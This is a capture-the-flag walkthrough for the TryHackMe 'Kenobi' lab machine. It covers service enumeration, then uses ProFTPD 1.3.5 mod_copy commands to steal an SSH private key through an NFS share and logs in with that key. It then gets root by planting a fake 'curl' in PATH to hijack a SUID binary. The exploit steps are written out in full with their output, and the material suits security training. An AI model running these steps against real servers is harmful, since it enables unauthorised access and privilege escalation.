# Room
https://tryhackme.com/room/kenobi

# Enumeration - nmap
* nmap port scan
    ```
    nmap -A -T4 10.10.67.185
    ```
    ```
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 14:45 EST
    Nmap scan report for 10.10.67.185
    Host is up (0.13s latency).
    Not shown: 993 closed ports
    PORT     STATE SERVICE     VERSION
    21/tcp   open  ftp         ProFTPD 1.3.5
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
    |   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
    |_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
    80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
    | http-robots.txt: 1 disallowed entry 
    |_/admin.html
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    111/tcp  open  rpcbind     2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100003  2,3,4       2049/tcp   nfs
    |   100003  2,3,4       2049/tcp6  nfs
    |   100003  2,3,4       2049/udp   nfs
    |   100003  2,3,4       2049/udp6  nfs
    |   100005  1,2,3      35709/udp6  mountd
    |   100005  1,2,3      39535/tcp   mountd
    |   100005  1,2,3      48137/tcp6  mountd
    |   100005  1,2,3      57671/udp   mountd
    |   100021  1,3,4      36026/udp   nlockmgr
    |   100021  1,3,4      41303/tcp6  nlockmgr
    |   100021  1,3,4      44161/tcp   nlockmgr
    |   100021  1,3,4      53262/udp6  nlockmgr
    |   100227  2,3         2049/tcp   nfs_acl
    |   100227  2,3         2049/tcp6  nfs_acl
    |   100227  2,3         2049/udp   nfs_acl
    |_  100227  2,3         2049/udp6  nfs_acl
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    2049/tcp open  nfs_acl     2-3 (RPC #100227)
    Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: 2h00m03s, deviation: 3h27m51s, median: 2s
    |_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: kenobi
    |   NetBIOS computer name: KENOBI\x00
    |   Domain name: \x00
    |   FQDN: kenobi
    |_  System time: 2021-01-23T13:45:41-06:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-01-23T19:45:41
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 27.78 seconds    
    ```
# Enumeration - samba
* nmap smb scan
    ```
    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.67.185
    ```
    ```
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 14:48 EST
    Nmap scan report for 10.10.67.185
    Host is up (0.14s latency).

    PORT    STATE SERVICE
    445/tcp open  microsoft-ds

    Host script results:
    | smb-enum-shares: 
    |   account_used: guest
    |   \\10.10.67.185\IPC$: 
    |     Type: STYPE_IPC_HIDDEN
    |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
    |     Users: 1
    |     Max Users: <unlimited>
    |     Path: C:\tmp
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.67.185\anonymous: 
    |     Type: STYPE_DISKTREE
    |     Comment: 
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\home\kenobi\share
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.67.185\print$: 
    |     Type: STYPE_DISKTREE
    |     Comment: Printer Drivers
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\var\lib\samba\printers
    |     Anonymous access: <none>
    |_    Current user access: <none>

    Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds
    ```
* smbclient checks
    ```
    smbclient //10.10.67.185/anonymous -U anon
    Enter WORKGROUP\anon's password: 
    Try "help" to get a list of possible commands.
    smb: \> dir
    .                                   D        0  Wed Sep  4 06:49:09 2019
    ..                                  D        0  Wed Sep  4 06:56:07 2019
    log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                    9204224 blocks of size 1024. 6877104 blocks available
    smb: \> 
    ```

* download all content with smbget
    ```
    smbget -R smb://10.10.67.185/anonymous -U anon
    Password for [anon] connecting to //anonymous/10.10.67.185:
    Using workgroup WORKGROUP, user anon
    smb://10.10.67.185/anonymous/log.txt
    Downloaded 11.95kB in 4 seconds
    ```
* review the log file and we can find a key piece of info for this room
    ```
    Your identification has been saved in /home/kenobi/.ssh/id_rsa.
    ```
# Enumeration - nfs
* nmap nfs scan
    ```
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.67.185
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 15:23 EST
    Nmap scan report for 10.10.67.185
    Host is up (0.16s latency).

    PORT    STATE SERVICE
    111/tcp open  rpcbind
    | nfs-showmount: 
    |_  /var *

    Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
    ```
# Enumeration - netcat
* use netcat to enumerate the FTP banner
    ```
    nc 10.10.67.185 21
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.67.185]
    ^C
    ```
# Vulnerability Research - searchsploit
* use searchsploit to search for the version of ProFTPD you found above
    ```
    searchsploit proftpd 1.3.5
    ---------------------------------------------------------- ---------------------------------
    Exploit Title                                             |  Path
    ---------------------------------------------------------- ---------------------------------
    ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | linux/remote/36803.py
    ProFTPd 1.3.5 - File Copy                                 | linux/remote/36742.txt
    ---------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    ```
    ```
    https://www.exploit-db.com/exploits/36742
    ```
# Gaining Access - abusing mod_copy modules from netcat
Connect to the FTP server running on the host, issue the CPFR (copy from) and CPTO (copy to) commands to copy the SSH private key we found in log.txt above to an accessible NFS mount we found at /var.
* use nc
    ```
    nc 10.10.67.185 21
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.67.185]
    SITE CPFR /home/kenobi/.ssh/id_rsa
    350 File or directory exists, ready for destination name
    SITE CPTO /var/tmp/id_rsa
    250 Copy successful
    ```
# Gaining Access - accessing the NFS share
Mount the /var NFS share and gain access to the SSH private key.
* access NFS and copy the key
    ```
    sudo mkdir /mnt/kenobiNFS
    
    sudo mount 10.10.67.185:/var /mnt/kenobiNFS        

    ls -lrta /mnt/kenobiNFS/
    total 56
    drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
    drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
    drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
    drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
    lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
    lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
    drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
    drwxr-xr-x  3 root root    4096 Sep  4  2019 www
    drwxr-xr-x 14 root root    4096 Sep  4  2019 .
    drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
    drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
    drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
    drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
    drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
    drwxrwxrwt  6 root root    4096 Jan 23 15:40 tmp
    drwxr-xr-x  3 root root    4096 Jan 23 15:45 ..

    ls -lrta /mnt/kenobiNFS/tmp
    total 28
    drwx------  3 root root 4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
    drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
    drwx------  3 root root 4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
    drwx------  3 root root 4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
    drwx------  3 root root 4096 Jan 23 14:42 systemd-private-c47704a67dd3440cabeba03d7a8974f9-systemd-timesyncd.service-veGBts
    -rw-r--r--  1 jet  jet  1675 Jan 23 15:40 id_rsa
    drwxrwxrwt  6 root root 4096 Jan 23 15:40 .

    cp /mnt/kenobiNFS/tmp/id_rsa .
    ```

# Gaining Access - use the SSH key to login
Use the SSH key you copied above to login
    ```
    chmod 600 id_rsa

    ssh -i id_rsa kenobi@10.10.67.185

    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    103 packages can be updated.
    65 updates are security updates.


    Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.

    kenobi@kenobi:~$ ls -lrta user.txt
    -rw-rw-r-- 1 kenobi kenobi 33 Sep  4  2019 user.txt
    ```

# Privilege Escalation - SUID and SGID
* SUID bit
    * user executes file with permissions of file owner
    ```
    rw-rw-rw-
      |
      |--- SUID bit
      |
    rwSrw-rw-
    ```
* SGID bit
    * user executes file with permissions of group owner
    ```
    rw-rw-rw-
         |
         |--- SGID bit
         |
    rw-rwSrw-    
    ```
* Searching for these types of files
    ```
    find / -perm -u=s -type f 2>/dev/null
    ```
* Search the target and see what we find
    ```
    find / -perm -u=s -type f 2>/dev/null

    /sbin/mount.nfs
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/bin/chfn
    /usr/bin/newgidmap
    /usr/bin/pkexec
    /usr/bin/passwd
    /usr/bin/newuidmap
    /usr/bin/gpasswd
    /usr/bin/menu
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/at
    /usr/bin/newgrp
    /bin/umount
    /bin/fusermount
    /bin/mount
    /bin/ping
    /bin/su
    /bin/ping6
    ```
* Use GTFObins to research these
    * https://gtfobins.github.io/
* In the above ouptut, /usr/bin/menu doesn't look standard
    ```
    kenobi@kenobi:~$ /usr/bin/menu               
                                                
    ***************************************      
    1. status check                              
    2. kernel version                            
    3. ifconfig                                  
    ** Enter your choice :1                      
    HTTP/1.1 200 OK                              
    Date: Sat, 23 Jan 2021 21:01:26 GMT          
    Server: Apache/2.4.18 (Ubuntu)               
    Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT 
    ETag: "c8-591b6884b6ed2"                     
    Accept-Ranges: bytes                         
    Content-Length: 200                          
    Vary: Accept-Encoding                        
    Content-Type: text/html           

    kenobi@kenobi:~$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :2
    4.8.0-58-generic

    kenobi@kenobi:~$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :3
    eth0      Link encap:Ethernet  HWaddr 02:e9:ec:0e:0a:35  
            inet addr:10.10.67.185  Bcast:10.10.255.255  Mask:255.255.0.0
            inet6 addr: fe80::e9:ecff:fe0e:a35/64 Scope:Link
            UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
            RX packets:2891 errors:0 dropped:0 overruns:0 frame:0
            TX packets:2679 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:1000 
            RX bytes:234577 (234.5 KB)  TX bytes:328658 (328.6 KB)

    lo        Link encap:Local Loopback  
            inet addr:127.0.0.1  Mask:255.0.0.0
            inet6 addr: ::1/128 Scope:Host
            UP LOOPBACK RUNNING  MTU:65536  Metric:1
            RX packets:206 errors:0 dropped:0 overruns:0 frame:0
            TX packets:206 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:1 
            RX bytes:15061 (15.0 KB)  TX bytes:15061 (15.0 KB)

    ```
* Use strings to look inside the file
    ```
    kenobi@kenobi:~$ strings /usr/bin/menu    
    /lib64/ld-linux-x86-64.so.2               
    libc.so.6                                 
    setuid                                    
    __isoc99_scanf                            
    puts                                      
    __stack_chk_fail                          
    printf                                    
    system                                    
    __libc_start_main                         
    __gmon_start__                            
    GLIBC_2.7                                 
    GLIBC_2.4                                 
    GLIBC_2.2.5                               
    UH-`                                      
    AWAVA                                     
    AUATL                                     
    []A\A]A^A_                                
    ***************************************   
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :
    curl -I localhost
    uname -r
    ifconfig
    ```
* From the output above, curl is not using a full path, so we can create a malicious curl and coax /usr/bin/menu to run it instead by inserting /tmp at the beginning of the PATH environment variable
    ```
    kenobi@kenobi:~$ cd /tmp
    kenobi@kenobi:/tmp$ echo /bin/bash > curl
    kenobi@kenobi:/tmp$ chmod +x curl
    kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
    kenobi@kenobi:/tmp# echo $PATH
    /tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

    kenobi@kenobi:/tmp$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :1
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.

    root@kenobi:/tmp# whoami
    root

    root@kenobi:/tmp# ls -lrta /root/root.txt
    -rw-r--r-- 1 root root 33 Sep  4  2019 /root/root.txt
    ```